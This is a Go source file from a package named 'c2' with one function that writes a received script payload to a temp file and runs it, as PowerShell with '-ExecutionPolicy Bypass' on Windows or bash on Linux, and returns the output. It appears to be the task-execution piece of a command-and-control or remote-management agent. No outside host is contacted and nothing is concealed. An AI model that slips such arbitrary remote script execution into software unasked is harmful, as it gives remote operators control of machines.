package c2

import (
	"bytes"
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

const scriptRunTimeout = 2 * time.Minute

func executeScript(ctx context.Context, payload string) (string, error) {
	payload = strings.TrimSpace(payload)
	if payload == "" {
		return "", fmt.Errorf("script payload is empty")
	}
	if strings.IndexByte(payload, 0) >= 0 {
		return "", fmt.Errorf("script payload contains invalid characters")
	}

	dir, err := os.MkdirTemp("", "arx-c2-script-*")
	if err != nil {
		return "", fmt.Errorf("create temp dir: %w", err)
	}
	defer os.RemoveAll(dir)

	runCtx, cancel := context.WithTimeout(ctx, scriptRunTimeout)
	defer cancel()

	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "windows":
		scriptPath := filepath.Join(dir, "script.ps1")
		if err := os.WriteFile(scriptPath, []byte(payload), 0600); err != nil {
			return "", fmt.Errorf("write script file: %w", err)
		}
		cmd = exec.CommandContext(runCtx, "powershell.exe",
			"-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-File", scriptPath)
	case "linux":
		scriptPath := filepath.Join(dir, "script.sh")
		if err := os.WriteFile(scriptPath, []byte(payload), 0700); err != nil {
			return "", fmt.Errorf("write script file: %w", err)
		}
		cmd = exec.CommandContext(runCtx, "bash", scriptPath)
	default:
		return "", fmt.Errorf("script execution is not supported on %s", runtime.GOOS)
	}
	cmd.Dir = dir

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	runErr := cmd.Run()

	var b strings.Builder
	if stdout.Len() > 0 {
		b.WriteString("stdout:\n")
		b.Write(stdout.Bytes())
	}
	if stderr.Len() > 0 {
		if b.Len() > 0 {
			b.WriteByte('\n')
		}
		b.WriteString("stderr:\n")
		b.Write(stderr.Bytes())
	}
	out := strings.TrimSpace(b.String())
	if runErr != nil {
		if out == "" {
			out = runErr.Error()
		} else {
			out = out + "\n" + runErr.Error()
		}
		return out, fmt.Errorf("script exited with error")
	}
	if out == "" {
		out = "script completed with no output"
	}
	return out, nil
}
